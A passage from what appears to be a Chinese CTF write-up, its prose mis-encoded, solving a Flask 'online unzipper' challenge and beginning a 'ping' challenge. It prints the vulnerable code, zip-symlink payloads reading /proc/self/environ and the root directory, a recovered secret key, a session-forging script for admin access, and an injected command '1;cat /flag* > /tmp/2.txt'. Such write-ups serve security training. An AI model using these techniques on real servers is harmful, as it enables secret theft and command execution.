</span></span></span><span class="line"><span class="cl"><span class="s2">      - åœ¨ä¸Šä¼ ç›®å½•ä¸‹åˆ›å»ºç›®æ ‡å­ç›®å½•ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">      - å°†ä¸Šä¼ çš„zipæ–‡ä»¶ä¿å­˜åˆ°ç›®æ ‡ç›®å½•ä¸­ï¼Œå‘½åä¸º&#39;upload.zip&#39;ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">      - å°è¯•ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤è§£å‹è¯¥zipæ–‡ä»¶åˆ°ç›®æ ‡ç›®å½•ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">      - åˆ é™¤åŸå§‹çš„zipæ–‡ä»¶ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">      - è¿”å›è§£å‹æˆåŠŸä¿¡æ¯å’Œä¸€ä¸ªæŒ‡å‘ä¸‹è½½é¡µé¢çš„é“¾æ¥ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;username&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;æœªé€‰æ‹©æ–‡ä»¶&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">role</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s2">&#34;role&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">role</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">dirname</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;dirname&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">dirname</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">target_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">dirname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">target_dir</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">zip_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">target_dir</span><span class="p">,</span> <span class="s2">&#34;upload.zip&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">zip_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;unzip -o </span><span class="si">{</span><span class="n">zip_path</span><span class="si">}</span><span class="s2"> -d </span><span class="si">{</span><span class="n">target_dir</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;è§£å‹å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æ ¼å¼&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">zip_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;è§£å‹å®Œæˆï¼&lt;br&gt;ä¸‹è½½åœ°å€: &lt;a href=&#39;</span><span class="si">{</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;download&#39;</span><span class="p">,</span> <span class="n">folder</span><span class="o">=</span><span class="n">dirname</span><span class="p">)</span><span class="si">}</span><span class="s2">&#39;&gt;</span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span><span class="si">}</span><span class="s2">download/</span><span class="si">{</span><span class="n">dirname</span><span class="si">}</span><span class="s2">&lt;/a&gt;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;upload.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/download/&lt;folder&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download</span><span class="p">(</span><span class="n">folder</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ–‡ä»¶ä¸‹è½½åˆ—è¡¨é¡µé¢è·¯ç”±ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ ¹æ®URLä¸­çš„folderå‚æ•°ï¼Œå®šä½åˆ°ä¸Šä¼ ç›®å½•ä¸‹çš„å…·ä½“å­ç›®å½•ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ£€æŸ¥è¯¥å­ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™è¿”å›404é”™è¯¯ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    è·å–è¯¥å­ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¹¶æ¸²æŸ“ä¸‹è½½é¡µé¢æ¨¡æ¿ï¼Œå°†æ–‡ä»¶å¤¹åå’Œæ–‡ä»¶åˆ—è¡¨ä¼ é€’ç»™æ¨¡æ¿ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">folder</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">target_dir</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">target_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;download.html&#34;</span><span class="p">,</span> <span class="n">folder</span><span class="o">=</span><span class="n">folder</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/download/&lt;folder&gt;/&lt;filename&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download_file</span><span class="p">(</span><span class="n">folder</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    å•ä¸ªæ–‡ä»¶ä¸‹è½½è·¯ç”±ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ ¹æ®URLä¸­çš„folderå’Œfilenameå‚æ•°ï¼Œæ„å»ºæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    å°è¯•æ‰“å¼€æ–‡ä»¶å¹¶è¯»å–å†…å®¹ï¼Œç„¶åè¿”å›ä¸€ä¸ªResponseå¯¹è±¡ï¼Œè®¾ç½®é€‚å½“çš„MIMEç±»å‹å’ŒContent-Dispositionå¤´éƒ¨ä»¥è§¦å‘æµè§ˆå™¨ä¸‹è½½ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¿”å›404é”™è¯¯ï¼›å…¶ä»–é”™è¯¯è¿”å›500é”™è¯¯ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">folder</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span> <span class="c1"># æ³¨æ„ï¼šå¯¹äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚å›¾ç‰‡ï¼‰ï¼Œåº”ä½¿ç”¨&#39;rb&#39;æ¨¡å¼</span>
</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">content</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">mimetype</span><span class="o">=</span><span class="s2">&#34;application/octet-stream&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Content-Disposition&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;attachment; filename=</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;File not found&#34;</span><span class="p">,</span> <span class="mi">404</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å¯åŠ¨Flaskå¼€å‘æœåŠ¡å™¨ï¼Œç›‘å¬æ‰€æœ‰å…¬å…±IPï¼ˆ0.0.0.0ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰“è½¯é“¾æ¥ï¼Œåœ¨è™šæ‹Ÿæœºè¿›è¡Œä¸‹é¢å‘½ä»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ln -s /proc/self/environ link
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">zip --symlinks link.zip link
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šä¼ ä¸‹è½½linkæ–‡ä»¶å¾—åˆ°å¯†é’¥æ˜¯<code>#mu0cw9F#7bBCoF!</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask.sessions</span> <span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span>  <span class="s1">&#39;#mu0cw9F#7bBCoF!&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åˆ›å»ºä¸€ä¸ªä¼šè¯å¯¹è±¡</span>
</span></span><span class="line"><span class="cl"><span class="n">session_serializer</span> <span class="o">=</span> <span class="n">SecureCookieSessionInterface</span><span class="p">()</span><span class="o">.</span><span class="n">get_signing_serializer</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¦åºåˆ—åŒ–çš„æ•°æ®</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;role&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;root&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åºåˆ—åŒ–å¹¶åŠ å¯†æ•°æ®</span>
</span></span><span class="line"><span class="cl"><span class="n">serialized</span> <span class="o">=</span> <span class="n">session_serializer</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Encoded session:&#34;</span><span class="p">,</span> <span class="n">serialized</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¦‚æœéœ€è¦è§£ç ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç </span>
</span></span><span class="line"><span class="cl"><span class="n">decoded</span> <span class="o">=</span> <span class="n">session_serializer</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">serialized</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decoded session:&#34;</span><span class="p">,</span> <span class="n">decoded</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ä¸‹æ¥æ€ä¹ˆåŠï¼Ÿçœ‹é™„ä»¶çŸ¥é“ï¼Œflagæ–‡ä»¶åä¸èƒ½å‡†ç¡®çŸ¥é“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nb">set</span> <span class="o">-</span><span class="n">e</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RAND</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">urandom</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">dc</span> <span class="s1">&#39;a-zA-Z0-9&#39;</span> <span class="o">|</span> <span class="n">head</span> <span class="o">-</span><span class="n">c</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">FLAG_FILE</span><span class="o">=</span><span class="s2">&#34;/flag-$RAND.txt&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">[</span> <span class="o">-</span><span class="n">n</span> <span class="s2">&#34;$FLAG&#34;</span> <span class="p">];</span> <span class="n">then</span>
</span></span><span class="line"><span class="cl">    <span class="n">echo</span> <span class="s2">&#34;$FLAG&#34;</span> <span class="o">&gt;</span> <span class="s2">&#34;$FLAG_FILE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">unset</span> <span class="n">FLAG</span>
</span></span><span class="line"><span class="cl"><span class="n">export</span> <span class="n">FLAG</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exec</span> <span class="s2">&#34;$@&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯æˆ‘ä»¬ä¼ªé€ äº†adminådirnameå·²ç»æ˜¯å¯æ§çš„äº†ï¼Œæ‰€ä»¥å¯ä»¥åœ¨<code> os.system(f&quot;unzip -o {zip_path} -d {target_dir}&quot;)</code>é‡Œé¢æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥æ€ä¹ˆåŠï¼Ÿæ‰“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1;cat /flag* &gt; /tmp/2.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åç»§ç»­è½¯é“¾æ¥æ‹¿flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ln -s /tmp/2.txt link
</span></span><span class="line"><span class="cl">zip --symlinks link.zip link
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæ˜¯æ„é€ äº†å‘½ä»¤ï¼Œæ¥ä¸€ä¸ªè½¯é“¾æ¥æ‹¿flag</p>
<h3 id="è§£æ³•äºŒ">è§£æ³•äºŒ
</h3><p>ä¸€æ ·ä¼ªé€ adminå</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ln -s / torootpath
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">zip --symlinks rootlink.zip torootpath
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…ˆå°†æ ¹ç›®å½•æŒ‡å‘<code>torootpath</code>,ç„¶åå°±è®©æ–‡ä»¶è§£å‹åœ¨uploadsä¸‹</p>
<img src="image-20251125203948691.png" alt="image-20251125203948691" style="zoom:50%;" />
<img src="image-20251125203757259.png" alt="image-20251125203757259" style="zoom:50%;" />
<p>è®¿é—®<code>/download/torootpath</code>,ï¼ˆå› ä¸º<code>@app.route(&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;)</code>æ˜¯å±•ç¤ºç›®å½•ï¼Œè€ŒtorootpathæŒ‡å‘æ ¹ï¼Œæ‰€ä»¥è®¿é—®<code>/download/torootpath</code>å°±æ˜¯ç­‰äºè®¿é—®æ ¹ç›®å½•ï¼‰ï¼Œç›´æ¥ç‚¹å‡»æ‹¿flagå³å¯</p>
<p>è§£æ³•äºŒå‚è€ƒhttps://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2/#online-unzipper</p>
<h2 id="ping">ping
</h2><h3 id="è€ƒç‚¹åˆ©ç”¨pythonä¸lunixè§£æbase64çš„å·®å¼‚æŒ‡å‘å‘½ä»¤">è€ƒç‚¹ï¼šåˆ©ç”¨pythonä¸Lunixè§£æbase64çš„å·®å¼‚æŒ‡å‘å‘½ä»¤
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ipaddress</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">flask</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run_ping</span><span class="p">(</span><span class="n">ip_base64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">decoded_ip</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ip_base64</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^\d+\.\d+\.\d+\.\d+$&#39;</span><span class="p">,</span> <span class="n">decoded_ip</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">decoded_ip</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="nb">all</span><span class="p">(</span><span class="mi">0</span> <span class="o">&lt;=</span> <span class="nb">int</span><span class="p">(</span><span class="n">part</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">256</span> <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">decoded_ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_address</span><span class="p">(</span><span class="n">decoded_ip</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">decoded_ip</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">15</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[A-Za-z0-9+/=]+$&#39;</span><span class="p">,</span> <span class="n">ip_base64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;echo &#34;ping -c 1 $(echo &#39;</span><span class="si">{</span><span class="n">ip_base64</span><span class="si">}</span><span class="s2">&#39; | base64 -d)&#34; | sh&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">command</span><span class="p">,</span>
